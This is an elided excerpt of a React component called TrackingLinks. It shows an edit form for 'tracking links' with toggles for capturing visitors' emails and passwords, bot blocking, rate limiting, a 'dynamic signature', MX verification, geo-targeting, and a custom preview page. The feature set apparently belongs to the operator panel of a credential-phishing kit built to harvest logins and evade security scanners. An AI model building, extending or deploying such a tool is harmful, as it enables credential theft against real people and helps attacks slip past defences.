...
const TrackingLinks = () => {
  ...
  const editLink = (link) => {
    ...
    setFormData({
      ...
      capture_email: link.capture_email || false,
      capture_password: link.capture_password || false,
      bot_blocking_enabled: link.bot_blocking_enabled || false,
      rate_limiting_enabled: link.rate_limiting_enabled || false,
      dynamic_signature_enabled: link.dynamic_signature_enabled || false,
      mx_verification_enabled: link.mx_verification_enabled || false,
      geo_targeting_enabled: link.geo_targeting_enabled || false,
      geo_filter_mode: 'allow',
      allowed_countries: '',
      blocked_countries: '',
      allowed_cities: '',
      blocked_cities: '',
      custom_preview_enabled: !!link.preview_template_url,
      preview_template_url: link.preview_template_url || ''
    });
  ...
  const regenerateLink = async (linkId) => {
    if (!confirm('Generate a new tracking link with the same settings? This will create a new link while keeping the original.')) {
      return;
    }
          ...
          <div className="bg-gray-800 rounded-lg p-6 w-full max-w-2xl max-h-[90vh] overflow-y-auto">
            ...
            <form onSubmit={handleEditLink} className="space-y-6">
              ...
              <div className="space-y-4">
                ...
                <div className="flex items-center justify-between">
                  <label htmlFor="edit_rate_limiting_enabled" className="text-gray-300">Rate Limiting</label>
                  <input
                    type="checkbox"
                    id="edit_rate_limiting_enabled"
                    checked={formData.rate_limiting_enabled}
                    onChange={(e) => setFormData({...formData, rate_limiting_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                ...
                <div className="flex items-center justify-between">
                  <label htmlFor="edit_dynamic_signature_enabled" className="text-gray-300">Dynamic Signature</label>
                  <input
                    type="checkbox"
                    id="edit_dynamic_signature_enabled"
                    checked={formData.dynamic_signature_enabled}
                    onChange={(e) => setFormData({...formData, dynamic_signature_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                ...
                <div className="flex items-center justify-between">
                  <label htmlFor="edit_mx_verification_enabled" className="text-gray-300">MX Verification</label>
                  <input
                    type="checkbox"
                    id="edit_mx_verification_enabled"
                    checked={formData.mx_verification_enabled}
                    onChange={(e) => setFormData({...formData, mx_verification_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
              ...
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Preview Settings</h4>
                <div className="flex items-center justify-between">
                  <label htmlFor="edit_custom_preview_enabled" className="text-gray-300">Custom Preview Page</label>
                  <input
                    type="checkbox"
                    id="edit_custom_preview_enabled"
                    checked={formData.custom_preview_enabled}
                    onChange={(e) => setFormData({...formData, custom_preview_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
